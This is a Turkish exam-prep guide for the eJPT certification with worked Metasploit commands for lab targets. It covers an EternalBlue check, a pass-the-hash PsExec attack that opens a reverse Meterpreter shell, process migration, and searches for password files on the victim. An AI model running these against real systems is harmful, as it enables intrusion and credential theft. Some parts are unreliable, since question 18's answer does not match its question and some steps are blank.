# 🎯 eJPT Sınav Soruları & Pratik Senaryolar — Metasploit Özel Sayısı 🏆

Bu dosya, eJPT (Junior Penetration Tester) sınavında Metasploit Framework ile ilgili **çıkmış ve çıkması muhtemel tüm soru tiplerini** gerçek sınav formatında derler. Her soru, sınavdaki gibi bir senaryo veya doğrudan bilgi sorusu olarak sunulmuş; cevaplar ise **hiçbir adım atlanmadan, baştan sona tam komut dizileriyle** yazılmıştır.

> [!IMPORTANT]
> **Sınav Formatı Hatırlatma:**
> eJPT sınavı %100 pratik (hands-on) bir sınavdır. 35 soru, 48 saat süre verilir. Sorular canlı lab ortamında sisteme sızarak cevaplanır. Teorik "şıklı" soru yoktur; her cevap lab'dan elde ettiğiniz bir veri parçasıdır (IP adresi, hash değeri, dosya içeriği, şifre vb.). Sınav açık kitap (open-book) formatındadır — kendi notlarınızı kullanabilirsiniz.

### Soru 1: Metasploit Framework'ü başlatmak ve veritabanı bağlantısını doğrulamak için hangi komutları çalıştırmanız gerekir?

**Cevap:**

```bash
# 1. PostgreSQL veritabanı servisini başlat (Metasploit veritabanı PostgreSQL kullanır)
systemctl start postgresql

# 2. Metasploit veritabanını ilklendir (sadece ilk kurulumda gerekir)
msfdb init

# 3. Metasploit konsolunu başlat
msfconsole

# 4. Veritabanı bağlantısını doğrula
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### Soru 2: Hedef IP adresi `10.10.10.5` olan bir sistemi Metasploit içinden Nmap ile tarayıp sonuçları veritabanına kaydetmek istiyorsunuz. Hangi komutu kullanırsınız?

**Cevap:**

```bash

msf6 > db_nmap -sV -O 10.10.10.5
```

**Tarama sonuçlarını sorgulamak için:**
```bash
# Keşfedilen tüm hostları listele
msf6 > hosts

# Keşfedilen tüm servisleri listele
msf6 > services

# Sadece 445 portu açık olan servisleri filtrele
msf6 > services -p 445
```

### Soru 3: Metasploit'te "EternalBlue" ile ilgili modülleri aramak ve sonuçları daraltmak istiyorsunuz. Arama komutlarını yazınız.

**Cevap:**

```bash
# Genel arama (İsimde ms17-010 geçen tüm modülleri getirir)
msf6 > search ms17-010

# Sadece exploit modüllerini getir
msf6 > search type:exploit ms17-010

# Windows platformu + 2017 CVE + Excellent güvenilirlik derecesi
msf6 > search type:exploit platform:windows cve:2017 rank:excellent smb

# Belirli bir modülü ismiyle ara
msf6 > search name:eternalblue
```

### Soru 4: `set` ve `setg` komutları arasındaki fark nedir? Sınavda hangisini ne zaman kullanmalısınız?

**Cevap:**

| Komut | Kapsam | Açıklama |
| :--- | :--- | :--- |
| `set RHOSTS 10.10.10.5` | **Sadece aktif modül** | Sadece o an seçili olan modülde geçerlidir. Başka bir modüle geçtiğinizde sıfırlanır. |
| `setg RHOSTS 10.10.10.5` | **Tüm modüller (Global)** | Modül değiştirseniz bile ayar korunur. Sınavda sürekli aynı hedefle çalışıyorsanız `setg` kullanın. |
| `unset RHOSTS` | Sadece aktif modülde temizler | — |
| `unsetg RHOSTS` | Global ayarı temizler | — |

**Sınav İpucu:** Sınavda birden fazla hedefe sızacağınız için `setg` yerine her modülde `set` komutunu kullanmanız daha güvenlidir. Yanlış hedefe exploit atma riskini ortadan kaldırır.

---

### Soru 5: Bir modülün çalışması için hangi parametrelerin zorunlu (Required) olduğunu nasıl öğrenirsiniz?

**Cevap:**

```bash
# 1. Modülü seç
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Zorunlu parametreleri görüntüle
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Çıktıda "Required" sütunu "yes" olan ve "Current Setting" boş olan her parametre
# doldurulması ZORUNLU olan parametredir.
```

**Çıktı Analizi:**
* `RHOSTS` → Required: **yes** → Boş ise hedef IP **girilmeli!**
* `RPORT` → Required: **yes** → Varsayılan değer var (445), değiştirmenize gerek yok.
* `LHOST` → Required: **yes** → Kendi IP'nizi veya `tun0` yazın.
* `SMBUser` → Required: **no** → Opsiyonel, boş kalabilir.

### Soru 8: Port 445 üzerindeki bir hedefte MS17-010 (EternalBlue) zafiyetinin var olup olmadığını exploit ATMADAN nasıl kontrol edersiniz?

**Cevap (İki Yöntem):**

**Yöntem 1: Auxiliary Tarayıcı ile (En Güvenli)**
```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.5
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# [+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010!
# Yeşil [+] görüyorsanız → Zafiyet VAR
# [-] görüyorsanız → Zafiyet YOK veya yamalı
```

**Yöntem 2: Exploit Modülünün `check` Komutu ile**
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

# [+] 10.10.10.5:445 - The target is vulnerable.
```

> [!NOTE]
> Her exploit modülü `check` fonksiyonunu desteklemez. Desteklemeyen modüllerde `This module does not support check` uyarısı alırsınız.

### Soru 9: Metasploit'in dahili TCP port tarayıcısını kullanarak `10.1.1.0/24` ağını tarayınız. Bu modülü ne zaman kullanırsınız?

**Cevap:**

```bash
# 1. TCP port tarayıcısını seç
msf6 > use auxiliary/scanner/portscan/tcp

# 2. Parametreleri ayarla
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.1.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80,443,445,3306,3389,8080
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50

# 3. Çalıştır
msf6 auxiliary(scanner/portscan/tcp) > run
```

**Ne zaman kullanılır:**
* Pivot yaptıktan sonra iç ağı tararken (Nmap bu ağa erişemez, route sadece Metasploit modüllerini yönlendirir)
* Proxychains + Nmap çok yavaş kalıyorsa

### Soru 14: Elinizde şifre yok ama bir NTLM hash değeri var: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`. Bu hash ile PsExec kullanarak "Pass-the-Hash" saldırısı yapınız.

**Cevap:**

```bash
# 1. PsExec modülünü seç
msf6 > use exploit/windows/smb/psexec

# 2. Hedefi ayarla
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.5
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator

# 3. Şifre yerine LM:NTLM formatında hash değerini gir
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# 4. Payload ayarla
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST tun0

# 5. Exploiti çalıştır
msf6 exploit(windows/smb/psexec) > exploit
```

> [!TIP]
> **Pass-the-Hash Mantığı:**
> Windows, şifreleri doğrularken düz metin şifre yerine NTLM hash değerini kullanır. Bu yüzden hash'i kırmadan doğrudan kullanabilirsiniz. `SMBPass` alanına `LM_Hash:NTLM_Hash` formatında yazmanız yeterlidir.

### Soru 15: Meterpreter oturumu açtıktan sonra hedef sistemin işletim sistemi, bilgisayar adı ve mimarisini nasıl öğrenirsiniz?

**Cevap:**

```bash
# Sistem bilgilerini görüntüle
meterpreter > sysinfo

# Örnek Çıktı:
# Computer        : WIN-VICTIM
# OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
# Architecture    : x64
# System Language : en_US
# Domain          : WORKGROUP
# Logged On Users : 2
# Meterpreter     : x86/windows
```

> [!WARNING]
> **Mimari Uyumsuzluğu Tespiti:**
> Çıktıda `Architecture: x64` ama `Meterpreter: x86/windows` görüyorsanız, 32-bit payload ile 64-bit sisteme girdiniz demektir. Bu durumda `hashdump`, `kiwi (mimikatz)` gibi araçlar düzgün çalışmayabilir. Derhal 64-bit bir sürece migrate edin!

### Soru 17: Meterpreter oturumunuzun kararlılığını sağlamak için süreç göçü (process migration) yapınız. Adımları ve dikkat edilecek noktaları yazınız.

**Cevap:**

```bash
# 1. Mevcut süreç ID'sini kontrol et
meterpreter > getpid
# Current pid: 3024

# 2. Çalışan tüm süreçleri listele
meterpreter > ps

# 3. Kararlı bir sürece göç et
# Windows'ta en uygun hedef süreçler:
#   - explorer.exe   → Kullanıcı yetkisindeyken (masaüstü süreci, stabil)
#   - services.exe   → SYSTEM yetkisindeyken
#   - winlogon.exe   → SYSTEM yetkisindeyken
#   - svchost.exe    → SYSTEM yetkisindeyken (birden fazla olabilir)

# PID numarası ile göç:
meterpreter > migrate 1844
# [*] Migrating from 3024 to 1844...
# [*] Migration completed successfully.

# VEYA isim ile doğrudan göç:
meterpreter > migrate -N explorer.exe

# 4. Göçün başarılı olduğunu doğrula
meterpreter > getpid
# Current pid: 1844
```

> [!CAUTION]
> **Migration Dikkat Noktaları:**
> * Eğer x86 (32-bit) Meterpreter ile x64 (64-bit) bir sürece migrate ederseniz, payload'unuz otomatik olarak 64-bit'e yükseltilir. Bu **iyi bir şeydir** — `hashdump` ve `kiwi` artık düzgün çalışır.
> * Eğer daha düşük yetkili bir sürece (Örn: SYSTEM'den student kullanıcısının explorer.exe'sine) migrate ederseniz, yetkinizi **kaybedebilirsiniz!**

### Soru 18: Hedef makinenin ağ arayüzlerini inceleyerek ikinci bir ağa bağlı olup olmadığını tespit ediniz.


```bash
# 1. Dosya arama (search komutu)
meterpreter > search -d c:\\Users\\ -f *.txt

#     c:\Users\Administrator\Desktop\flag.txt (32 bytes)
#     c:\Users\student\Documents\parolalar.txt (128 bytes)
#     c:\Users\student\Desktop\readme.txt (64 bytes)

# 2. Hassas dosyayı indir

# 3. İsme göre arama da yapılabilir
meterpreter > search -f *config*
meterpreter > search -f *password*
meterpreter > search -f *secret*
meterpreter > search -f *flag*
```

> [!NOTE]
